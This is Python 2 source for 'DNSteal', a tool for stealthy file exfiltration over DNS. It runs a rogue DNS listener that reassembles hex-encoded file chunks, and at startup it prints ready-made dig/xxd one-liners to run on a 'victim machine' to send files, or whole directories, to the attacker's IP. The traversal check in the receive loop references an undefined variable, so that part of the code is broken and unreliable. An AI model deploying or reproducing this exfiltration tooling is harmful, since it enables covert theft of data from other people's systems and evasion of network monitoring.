#!/usr/bin/env python
#  ~ \x90
######################

import socket
import sys
import binascii
import time
import random
import hashlib
import zlib

c = { "r" : "\033[1;31m", "g": "\033[1;32m", "y" : "\033[1;33m", "e" : "\033[0m" }
VERSION = "1.0"
	
class DNSQuery:
	def __init__(self, data):
		self.data = data
		self.data_text = ''

		tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
		if tipo == 0:                     # Standard query
			ini=12
			lon=ord(data[ini])
		while lon != 0:
			self.data_text += data[ini+1:ini+lon+1]+'.'
			ini += lon+1
			lon=ord(data[ini])

	def request(self, ip):
		packet=''
		if self.data_text:
			packet+=self.data[:2] + "\x81\x80"
			packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
			packet+=self.data[12:]                                         # Original Domain Name Question
			packet+='\xc0\x0c'                                             # Pointer to domain name
			packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
			packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
		return packet

def save_to_file(r_data, z):
	print "\n"
	for key,value in r_data.iteritems():

		fname = "recieved_%s" % key 
		flatdata = ""

		for block in value:
			flatdata += block

		if (z):
		        print "%s[ Info ]%s Unzipping data." % (c["y"], c["e"])
			x = zlib.decompressobj(16+zlib.MAX_WBITS)
			flatdata = x.decompress(binascii.unhexlify(flatdata))	

	        print "%s[ Info ]%s Saving recieved bytes to './%s'" % (c["y"], c["e"], fname)

		try:
			f = open(fname, "wb")
		except:
			print "%s[Error]%s Opening file '%s'" % (c["r"], c["e"], fname)
			exit(1)

		if (z):
			f.write(flatdata)
		else:
			try:
				f.write(binascii.unhexlify(flatdata))
			except:
				print "%s[Error]%s Data recieved for file '%s' does not look like hex-encoded data." % (c["r"], c["e"], fname)
				print "%s[Error]%s Exiting..." % (c["r"], c["e"])
				exit(1)
		f.close()

		print "%s[md5sum]%s '%s'" % (c["g"], c["e"], hashlib.md5(open(fname, "r").read()).hexdigest())


def banner():

	print "\033[1;31m",
	print """
      ___  _  _ ___ _            _ 
     |   \| \| / __| |_ ___ __ _| |
     | |) | .` \__ \  _/ -_) _` | |
     |___/|_|\_|___/\__\___\__,_|_|v%s

-- https://github.com/m57/dnsteal.git --\033[0m

Stealthy file extraction via DNS requests
""" % VERSION

if __name__ == '__main__':

	z = False

	try:
		ip = sys.argv[1]
		if "-z" in sys.argv:
			z = True
	except:

		banner()
		print "Usage: python %s [listen_address] [-z (optional: unzip incoming data)]" % sys.argv[0]
		exit(1)

	banner()
	udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	udp.bind((ip,53))

	print "%s[+]%s DNS listening on '%s:53'" % (c["g"], c["e"], ip)
	print "%s[+]%s Now on the victim machine, use any of the following commands (or similar):" % (c["y"], c["e"])
	print "\t%s[\x23]%s for b in $(xxd -p /path/to/file); do dig +short @%s $b.filename.com; done" % (c["r"], c["e"], ip )
	print "\t%s[\x23]%s for b in $(gzip -c /path/to/file | xxd -p); do dig +short @%s $b.filename.com; done\n" % (c["r"], c["e"], ip)
	print "\t%s[\x23]%s for f in $(ls *); do for b in $(xxd -p $f); do dig +short @%s $b.$f.com; done; done" % (c["r"], c["e"], ip)
	print "\t%s[\x23]%s for f in $(ls *); do for b in $(gzip -c $f | xxd -p); do dig +short @%s $b.$f.com; done; done\n" % (c["r"], c["e"], ip)
	print "%s[+]%s Once files have sent, use Ctrl+C to exit and save.\n" % (c["g"], c["e"])
  
	file_seed = random.randint(1,32768)

	try:
		r_data = {}
		while 1:
      
			data, addr = udp.recvfrom(1024)
			p=DNSQuery(data)
			udp.sendto(p.request(ip), addr)
			print 'Request: %s -> %s' % (p.data_text, ip)

			if ".." in p.data_text in key or "/" in p.data_text:
				print "%s[Error]%s Filename or data should not contain '..' or '/'\n%s[Error]%s Sorry, exiting..." % (c["r"], c["e"], c["r"], c["e"])
				exit(1)

			fname = p.data_text.split(".")[1]
			if fname not in r_data:
				r_data[fname] = []

			r_data[fname].append(p.data_text.split(".")[0])
	
	except KeyboardInterrupt:
		save_to_file(r_data, z)
		print '\n\033[1;31m[!]\033[0m Closing...'
		udp.close()
